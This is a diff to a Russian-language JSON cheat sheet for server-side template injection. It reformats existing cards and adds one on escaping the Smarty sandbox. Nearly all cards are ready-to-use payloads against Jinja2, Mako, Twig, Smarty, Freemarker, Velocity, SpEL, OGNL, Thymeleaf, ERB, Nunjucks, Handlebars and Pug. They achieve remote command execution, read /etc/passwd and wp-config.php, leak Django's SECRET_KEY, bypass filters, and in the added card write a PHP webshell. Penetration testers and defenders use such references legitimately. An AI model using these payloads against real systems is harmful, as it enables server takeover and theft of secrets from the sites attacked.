@@ -6,7 +6,11 @@
       "subcategory": "Детект",
       "title": "Схема определения движка по ${7*7}",
       "language": "image",
-      "tags": ["detection", "ssti", "fingerprint"],
+      "tags": [
+        "detection",
+        "ssti",
+        "fingerprint"
+      ],
       "body": "",
       "meta": {
         "kind": "image",
@@ -18,47 +22,81 @@
       "subcategory": "Детект",
       "title": "Polyglot — вызвать ошибку при наличии SSTI",
       "language": "text",
-      "tags": ["detection", "polyglot"],
+      "tags": [
+        "detection",
+        "polyglot"
+      ],
       "body": "${{<%[%'\"}}%\\."
     },
     {
       "subcategory": "Детект",
       "title": "Общие теги для проверки SSTI",
       "language": "text",
-      "tags": ["detection"],
+      "tags": [
+        "detection"
+      ],
       "body": "{{ ... }}\n${ ... }\n#{ ... }\n<%= ... %>\n{ ... }\n{{= ... }}\n*{ ... }\n@{ ... }\n@( ... )"
     },
     {
       "subcategory": "Детект",
       "title": "Математический пробник (rendered)",
       "language": "text",
-      "tags": ["detection"],
+      "tags": [
+        "detection"
+      ],
       "body": "7*7      → 49        вычислилось = SSTI\n7*'7'    → 7777777   Jinja2 / Twig / Tornado\nОберни в тег движка: {{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>"
     },
     {
       "subcategory": "Детект",
       "title": "Error-based пробник",
       "language": "text",
-      "tags": ["detection", "error-based"],
+      "tags": [
+        "detection",
+        "error-based"
+      ],
       "body": "(1/0).zxy.zxy   — если ошибка видна, по её тексту определяем язык (см. таблицу ниже)"
     },
     {
       "subcategory": "Детект",
       "title": "Ошибка деления на ноль → язык",
       "language": "table",
-      "tags": ["detection", "error-based"],
+      "tags": [
+        "detection",
+        "error-based"
+      ],
       "body": "ZeroDivisionError Python java.lang.ArithmeticException Java ReferenceError TypeError NodeJS Division by zero PHP divided by 0 Ruby Arithmetic operation failed Freemarker",
       "meta": {
         "kind": "table",
         "table": {
-          "headers": ["Текст ошибки", "Язык / движок"],
+          "headers": [
+            "Текст ошибки",
+            "Язык / движок"
+          ],
           "rows": [
-            ["ZeroDivisionError", "Python"],
-            ["java.lang.ArithmeticException", "Java"],
-            ["ReferenceError / TypeError", "NodeJS"],
-            ["Division by zero / DivisionByZeroError", "PHP"],
-            ["divided by 0", "Ruby"],
-            ["Arithmetic operation failed", "Freemarker (Java)"]
+            [
+              "ZeroDivisionError",
+              "Python"
+            ],
+            [
+              "java.lang.ArithmeticException",
+              "Java"
+            ],
+            [
+              "ReferenceError / TypeError",
+              "NodeJS"
+            ],
+            [
+              "Division by zero / DivisionByZeroError",
+              "PHP"
+            ],
+            [
+              "divided by 0",
+              "Ruby"
+            ],
+            [
+              "Arithmetic operation failed",
+              "Freemarker (Java)"
+            ]
           ]
         }
       }
@@ -67,15 +105,30 @@
       "subcategory": "Детект",
       "title": "Boolean-based пары (ok / ошибка)",
       "language": "table",
-      "tags": ["detection", "boolean-based"],
+      "tags": [
+        "detection",
+        "boolean-based"
+      ],
       "body": "boolean based blind пары ok error",
       "meta": {
         "kind": "table",
         "table": {
-          "headers": ["#", "ok (валидно)", "ошибка (синтаксис)"],
+          "headers": [
+            "#",
+            "ok (валидно)",
+            "ошибка (синтаксис)"
+          ],
           "rows": [
-            ["1", "(3*4/2)", "3*)2(/4"],
-            ["2", "((7*8)/(2*4))", "7)(*)8)(2/(*4"]
+            [
+              "1",
+              "(3*4/2)",
+              "3*)2(/4"
+            ],
+            [
+              "2",
+              "((7*8)/(2*4))",
+              "7)(*)8)(2/(*4"
+            ]
           ]
         }
       }
@@ -84,20 +137,47 @@
       "subcategory": "Детект",
       "title": "Движок → формат тега",
       "language": "table",
-      "tags": ["detection", "fingerprint"],
+      "tags": [
+        "detection",
+        "fingerprint"
+      ],
       "body": "jinja2 twig mako smarty freemarker velocity erb handlebars pug thymeleaf spel format",
       "meta": {
         "kind": "table",
         "table": {
-          "headers": ["Движок", "Формат тега"],
+          "headers": [
+            "Движок",
+            "Формат тега"
+          ],
           "rows": [
-            ["Jinja2 / Django / Twig / Nunjucks / Handlebars", "{{ }}"],
-            ["Mako / Freemarker / SpEL / Java EL / Chameleon", "${ }"],
-            ["Smarty / Latte / DustJS", "{ }"],
-            ["Thymeleaf", "[[ ]]"],
-            ["ERB / EJS / Underscore", "<%= %> / <% %>"],
-            ["Slim / HAML / Pug", "#{ }"],
-            ["Velocity", "#set($x=\"\") $x"]
+            [
+              "Jinja2 / Django / Twig / Nunjucks / Handlebars",
+              "{{ }}"
+            ],
+            [
+              "Mako / Freemarker / SpEL / Java EL / Chameleon",
+              "${ }"
+            ],
+            [
+              "Smarty / Latte / DustJS",
+              "{ }"
+            ],
+            [
+              "Thymeleaf",
+              "[[ ]]"
+            ],
+            [
+              "ERB / EJS / Underscore",
+              "<%= %> / <% %>"
+            ],
+            [
+              "Slim / HAML / Pug",
+              "#{ }"
+            ],
+            [
+              "Velocity",
+              "#set($x=\"\") $x"
+            ]
           ]
         }
       }
@@ -106,243 +186,365 @@
       "subcategory": "Методология",
       "title": "Техники детекта и эксплуатации",
       "language": "text",
-      "tags": ["methodology"],
+      "tags": [
+        "methodology"
+      ],
       "body": "Rendered     результат инъекции виден прямо на странице — самый простой случай.\nError-Based  результат прилетает в текст ошибки (нужны verbose-ошибки).\nBoolean      условно триггеришь ошибку → блайнд да/нет.\nTime-Based   условная задержка (sleep) → блайнд по времени.\nOut-of-Band  результат уходит на твой сервер (DNS/HTTP).\nPolyglot     один payload — по реакции движка быстро понимаешь, какой он."
     },
     {
       "subcategory": "Методология",
       "title": "Где искать SSTI",
       "language": "text",
-      "tags": ["methodology", "recon"],
+      "tags": [
+        "methodology",
+        "recon"
+      ],
       "body": "• Генерируемые PDF, инвойсы, письма почти всегда на шаблонах.\n• Поля имени/приветствия, превью шаблонов, темы и тела писем, кастомные сообщения.\n• Любой ввод, который потом отрисовывается обратно пользователю.\n• Сначала {{7*7}} и ${7*7}; посчиталось — определяй движок и эскалируй до RCE."
     },
     {
       "subcategory": "Методология",
       "title": "Тулзы и ресурсы",
       "language": "text",
-      "tags": ["tools"],
+      "tags": [
+        "tools"
+      ],
       "body": "tplmap / SSTImap — автоэксплуатация SSTI.\nHackmanit template-injection-table — интерактивная таблица полиглотов на 44 движка.\n@0xAwali «template-engines-injection-101» — как различать движки с одинаковым синтаксисом."
     },
-
     {
       "subcategory": "Jinja2 (Python)",
       "title": "Jinja2 — детект",
       "language": "python",
-      "tags": ["jinja2", "python", "detection"],
+      "tags": [
+        "jinja2",
+        "python",
+        "detection"
+      ],
       "body": "{{7*7}}        → 49\n{{7*'7'}}      → 7777777\n{{config.items()}}"
     },
     {
       "subcategory": "Jinja2 (Python)",
       "title": "Jinja2 — RCE (самый короткий, lipsum)",
       "language": "python",
-      "tags": ["jinja2", "rce"],
+      "tags": [
+        "jinja2",
+        "rce"
+      ],
       "body": "{{ lipsum.__globals__['os'].popen('id').read() }}"
     },
     {
       "subcategory": "Jinja2 (Python)",
       "title": "Jinja2 — RCE (если __builtins__ фильтруется)",
       "language": "python",
-      "tags": ["jinja2", "rce", "bypass"],
+      "tags": [
+        "jinja2",
+        "rce",
+        "bypass"
+      ],
       "body": "{{ cycler.__init__.__globals__.os.popen('id').read() }}\n{{ joiner.__init__.__globals__.os.popen('id').read() }}\n{{ namespace.__init__.__globals__.os.popen('id').read() }}"
     },
     {
       "subcategory": "Jinja2 (Python)",
       "title": "Jinja2 — RCE (классический, os.popen)",
       "language": "python",
-      "tags": ["jinja2", "rce"],
+      "tags": [
+        "jinja2",
+        "rce"
+      ],
       "body": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
     },
     {
       "subcategory": "Jinja2 (Python)",
       "title": "Jinja2 — чтение файла",
       "language": "python",
-      "tags": ["jinja2", "file-read"],
+      "tags": [
+        "jinja2",
+        "file-read"
+      ],
       "body": "{{ get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read() }}"
     },
     {
       "subcategory": "Jinja2 (Python)",
       "title": "Jinja2 — обход фильтра _ и точки",
       "language": "python",
-      "tags": ["jinja2", "waf-bypass"],
+      "tags": [
+        "jinja2",
+        "waf-bypass"
+      ],
       "body": "{{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fimport\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')()}}"
     },
     {
       "subcategory": "Mako (Python)",
       "title": "Mako — RCE",
       "language": "python",
-      "tags": ["mako", "rce"],
+      "tags": [
+        "mako",
+        "rce"
+      ],
       "body": "${self.module.cache.util.os.system('id')}\n${self.__init__.__globals__['os'].system('id')}"
     },
     {
       "subcategory": "Mako (Python)",
       "title": "Mako — RCE через import",
       "language": "python",
-      "tags": ["mako", "rce"],
+      "tags": [
+        "mako",
+        "rce"
+      ],
       "body": "<%import os%>${os.popen('id').read()}"
     },
     {
       "subcategory": "Tornado (Python)",
       "title": "Tornado — RCE",
       "language": "python",
-      "tags": ["tornado", "rce"],
+      "tags": [
+        "tornado",
+        "rce"
+      ],
       "body": "{%import os%}{{os.system('id')}}"
     },
     {
       "subcategory": "Django (Python)",
       "title": "Django Templates — утечки",
       "language": "python",
-      "tags": ["django", "leak"],
+      "tags": [
+        "django",
+        "leak"
+      ],
       "body": "{{ messages.storages.0.signer.key }}     SECRET_KEY\n{% debug %}                              дамп контекста\n{% include 'admin/base.html' %}          URL админки"
     },
     {
       "subcategory": "Universal (Python)",
       "title": "Python — универсальные (Mako/Tornado/Cheetah/Bottle…)",
       "language": "python",
-      "tags": ["python", "rce", "universal"],
+      "tags": [
+        "python",
+        "rce",
+        "universal"
+      ],
       "body": "__import__('os').popen('id').read()                       Rendered\ngetattr('', 'x' + __import__('os').popen('id').read())    Error-Based\n1 / (__import__('os').popen('id')._proc.wait() == 0)     Boolean\n__import__('os').popen('id && sleep 5').read()           Time"
     },
-
     {
       "subcategory": "Twig (PHP)",
       "title": "Twig — детект",
       "language": "php",
-      "tags": ["twig", "php", "detection"],
+      "tags": [
+        "twig",
+        "php",
+        "detection"
+      ],
       "body": "{{7*7}}        → 49\n{{7*'7'}}      → 49\n{{dump(app)}}\n{{app.request.server.all|join(',')}}"
     },
     {
       "subcategory": "Twig (PHP)",
       "title": "Twig — RCE",
       "language": "php",
-      "tags": ["twig", "rce"],
+      "tags": [
+        "twig",
+        "rce"
+      ],
       "body": "{{['id']|filter('system')}}\n{{['id']|map('system')|join}}\n{{['id',1]|sort('system')|join}}\n{{ {'id':'shell_exec'}|map('call_user_func')|join }}"
     },
     {
       "subcategory": "Twig (PHP)",
       "title": "Twig — чтение файла",
       "language": "php",
-      "tags": ["twig", "file-read"],
+      "tags": [
+        "twig",
+        "file-read"
+      ],
       "body": "{{include('wp-config.php')}}\n{{'/etc/passwd'|file_excerpt(1,30)}}"
     },
     {
       "subcategory": "Smarty (PHP)",
       "title": "Smarty — RCE",
       "language": "php",
-      "tags": ["smarty", "rce"],
-      "body": "{$smarty.version}\n{system('id')}            // v3, deprecated в v5\n{php}echo `id`;{/php}     // deprecated в v3"
+      "tags": [
+        "smarty",
+        "rce"
+      ],
+      "body": "{$smarty.version}\n{system('id')}            // v3, deprecated в v5\n{php}echo `id`;{/php}     // deprecated в v3\n\n⚠ На Smarty 3.1+ {system} блокируется Security Policy, {php} удалён — рабочий обход см. в карточке ниже."
+    },
+    {
+      "subcategory": "Smarty (PHP)",
+      "title": "Smarty — RCE на современных версиях (обход sandbox)",
+      "language": "text",
+      "tags": [
+        "ssti",
+        "smarty",
+        "php",
+        "rce",
+        "sandbox-escape"
+      ],
+      "body": "На Smarty 3.1+ дефолтная Security Policy блокирует {system}, а {php} удалён — нужен обход через статические методы / нативные теги:\n\nЗапись вебшелла статическим методом (классический обход песочницы):\n{Smarty_Internal_Write_File::writeFile(\"./shell.php\",\"<?php system($_GET[cmd]); ?>\",$smarty)}\n\nЭскейп песочницы через template_object (CVE-2021-26119, Smarty < 3.1.39):\n{$smarty.template_object->smarty->_getSmartyObj()}  — доступ к внутренним объектам Smarty\n\nИнъекция в {math} (CVE-2021-29454, < 3.1.42 / 4.0.2):\n{math equation=\"('system')('id')\"}\n\nВерсия: {$smarty.version}. Защита: Smarty >= 4.x с актуальной Security Policy; не давать пользователю управлять телом шаблона."
     },
     {
       "subcategory": "Universal (PHP)",
       "title": "PHP — универсальные (Blade/Latte/Smarty)",
       "language": "php",
-      "tags": ["php", "rce", "universal"],
+      "tags": [
+        "php",
+        "rce",
+        "universal"
+      ],
       "body": "system('id')\nshell_exec('id')\n1 / (pclose(popen('id', 'wb')) == 0)     Boolean\nsystem('id && sleep 5')                  Time"
     },
-
     {
       "subcategory": "Freemarker (Java)",
       "title": "Freemarker — детект",
       "language": "java",
-      "tags": ["freemarker", "java", "detection"],
+      "tags": [
+        "freemarker",
+        "java",
+        "detection"
+      ],
       "body": "${3*3}      → 9   (default)\n#{3*3}            (legacy)\n[=3*3]            (alt, 2.3.4+)"
     },
     {
       "subcategory": "Freemarker (Java)",
       "title": "Freemarker — RCE",
       "language": "java",
-      "tags": ["freemarker", "rce"],
+      "tags": [
+        "freemarker",
+        "rce"
+      ],
       "body": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ ex('id') }\n${\"freemarker.template.utility.Execute\"?new()('id')}"
     },
     {
       "subcategory": "Freemarker (Java)",
       "title": "Freemarker — чтение файла",
       "language": "java",
-      "tags": ["freemarker", "file-read"],
+      "tags": [
+        "freemarker",
+        "file-read"
+      ],
       "body": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}"
     },
     {
       "subcategory": "Velocity (Java)",
       "title": "Velocity — RCE",
       "language": "java",
-      "tags": ["velocity", "rce"],
+      "tags": [
+        "velocity",
+        "rce"
+      ],
       "body": "#set($str=$class.inspect('java.lang.String').type)\n#set($chr=$class.inspect('java.lang.Character').type)\n#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime().exec('id'))\n$ex.waitFor()\n#set($out=$ex.getInputStream())\n#foreach($i in [1..$out.available()])\n$str.valueOf($chr.toChars($out.read()))\n#end"
     },
     {
       "subcategory": "SpEL / Java EL (Java)",
       "title": "SpEL / Java EL — детект и RCE",
       "language": "java",
-      "tags": ["spel", "java-el", "rce"],
+      "tags": [
+        "spel",
+        "java-el",
+        "rce"
+      ],
       "body": "${7*7}\n${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}\n${T(java.lang.System).getenv()}\nЕсли ${...} не сработал — пробуй #{...} *{...} @{...} ~{...}"
     },
     {
       "subcategory": "OGNL (Java)",
       "title": "OGNL — RCE (Struts)",
       "language": "java",
-      "tags": ["ognl", "struts", "rce"],
+      "tags": [
+        "ognl",
+        "struts",
+        "rce"
+      ],
       "body": "new String(@java.lang.Runtime@getRuntime().exec('id').getInputStream().readAllBytes())"
     },
     {
       "subcategory": "Thymeleaf (Java)",
       "title": "Thymeleaf — детект / RCE",
       "language": "java",
-      "tags": ["thymeleaf", "detection", "rce"],
+      "tags": [
+        "thymeleaf",
+        "detection",
+        "rce"
+      ],
       "body": "[[${7*7}]]\n#{7*7}\n[[${T(java.lang.Runtime).getRuntime().exec('id')}]]"
     },
-
     {
       "subcategory": "ERB (Ruby)",
       "title": "ERB — детект и RCE",
       "language": "ruby",
-      "tags": ["erb", "ruby", "rce"],
+      "tags": [
+        "erb",
+        "ruby",
+        "rce"
+      ],
       "body": "<%= 7*7 %>                        детект → 49\n<%= system('id') %>\n<%= `id` %>\n<%= IO.popen('ls /').readlines() %>"
     },
     {
       "subcategory": "ERB (Ruby)",
       "title": "ERB — чтение файла / список",
       "language": "ruby",
-      "tags": ["erb", "file-read"],
+      "tags": [
+        "erb",
+        "file-read"
+      ],
       "body": "<%= File.open('/etc/passwd').read %>\n<%= Dir.entries('/') %>"
     },
     {
       "subcategory": "Universal (Ruby)",
       "title": "Ruby — универсальные + Slim",
       "language": "ruby",
-      "tags": ["ruby", "slim", "rce", "universal"],
+      "tags": [
+        "ruby",
+        "slim",
+        "rce",
+        "universal"
+      ],
       "body": "%x('id')                  Rendered (Erb/Erubi/HAML/Slim)\n1/(system('id')&&1||0)    Boolean\nsystem('id && sleep 5')   Time\n#{ %x|id| }               Slim"
     },
-
     {
       "subcategory": "Universal (NodeJS)",
       "title": "NodeJS — универсальные (EJS/Pug/DotJS…)",
       "language": "javascript",
-      "tags": ["nodejs", "rce", "universal"],
+      "tags": [
+        "nodejs",
+        "rce",
+        "universal"
+      ],
       "body": "global.process.mainModule.require('child_process').execSync('id').toString()"
     },
     {
       "subcategory": "Nunjucks (JS)",
       "title": "Nunjucks — RCE",
       "language": "javascript",
-      "tags": ["nunjucks", "rce"],
+      "tags": [
+        "nunjucks",
+        "rce"
+      ],
       "body": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('id')\")()}}"
     },
     {
       "subcategory": "Handlebars (JS)",
       "title": "Handlebars — детект",
       "language": "javascript",
-      "tags": ["handlebars", "detection"],
+      "tags": [
+        "handlebars",
+        "detection"
+      ],
       "body": "{{this}}\n{{self}}"
     },
     {
       "subcategory": "Handlebars (JS)",
       "title": "Handlebars — RCE (уязвимые версии)",
       "language": "handlebars",
-      "tags": ["handlebars", "rce"],
+      "tags": [
+        "handlebars",
+        "rce"
+      ],
       "body": "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub \"constructor\")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push \"return require('child_process').execSync('id');\"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}"
     },
     {
       "subcategory": "Pug (JS)",
       "title": "Pug — RCE",
       "language": "javascript",
-      "tags": ["pug", "jade", "rce"],
+      "tags": [
+        "pug",
+        "jade",
+        "rce"
+      ],
       "body": "#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}"
     }
   ]
